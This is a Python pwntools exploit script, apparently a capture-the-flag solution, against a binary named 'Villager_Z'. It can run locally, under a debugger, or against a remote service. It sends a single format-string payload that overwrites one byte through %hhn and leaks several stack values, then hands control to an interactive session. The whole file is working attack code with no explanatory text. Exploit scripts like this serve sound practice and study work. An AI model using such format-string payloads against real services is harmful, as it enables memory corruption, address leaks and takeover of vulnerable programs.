#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./Villager_Z"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+82
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"%179p%35$hhn|%40$p|%41$p|%43$p|"

p.recvuntil("?")
p.sendline(payload)

p.interactive()